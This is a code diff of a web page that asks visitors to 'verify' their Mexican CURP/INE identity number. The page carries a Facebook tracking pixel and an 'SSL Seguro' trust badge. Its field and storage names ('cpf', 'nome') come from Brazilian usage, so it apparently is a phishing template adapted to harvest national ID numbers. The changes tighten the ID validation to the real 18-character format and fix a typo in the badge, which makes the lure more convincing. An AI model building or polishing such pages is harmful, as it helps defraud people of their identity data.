@@ -992,7 +992,7 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
 <form id="step1Form">
 <div class="form-group">
 <label><span data-msg="step2.t04">Tu CURP / INE</span></label>
-<input id="cpf" inputmode="numeric" maxlength="20" placeholder="Ej. HEGG560427MVZRRL04" required="" type="tel"/>
+<input id="cpf" inputmode="text" maxlength="18" placeholder="Ej. HEGG560427MVZRRL04" required="" type="text" style="text-transform:uppercase"/>
 </div>
 <button class="btn btn-primary" id="submitBtn1" type="submit">
 <span class="btn-text"><span data-msg="step2.t05">Verificar mi CURP / INE</span></span>
@@ -1093,7 +1093,7 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
 <path d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" stroke-linecap="round" stroke-linejoin="round" stroke-width="2">
 </path>
 </svg>
-          SSL Segurod
+          SSL Seguro
         </span>
 <span>
 <svg fill="none" stroke="currentColor" viewbox="0 0 24 24">
@@ -1138,11 +1138,11 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
     document.getElementById('step1Form').addEventListener('submit', async e => {
       e.preventDefault();
 
-      const nif = document.getElementById('cpf').value.replace(/\D/g, '');
+      const nif = document.getElementById('cpf').value.replace(/\s/g, '').toUpperCase();
       const btn = document.getElementById('submitBtn1');
 
-      if (nif.length < 6 || nif.length > 15) {
-        alert('CURP / INE inválido. Por favor verifica el número e intenta de nuevo.');
+      if (nif.length !== 18) {
+        alert('CURP / INE inválido. Debe tener exactamente 18 caracteres.');
         return;
       }
 
@@ -1161,7 +1161,7 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
 
       // Pre-fill if it already exists
       const prev = localStorage.getItem('nome');
-      if (prev && prev !== 'CLIENTE TESTE') input.value = prev;
+      if (prev && prev !== 'TEST') input.value = prev;
       input.focus();
 
       input.addEventListener('input', () => {
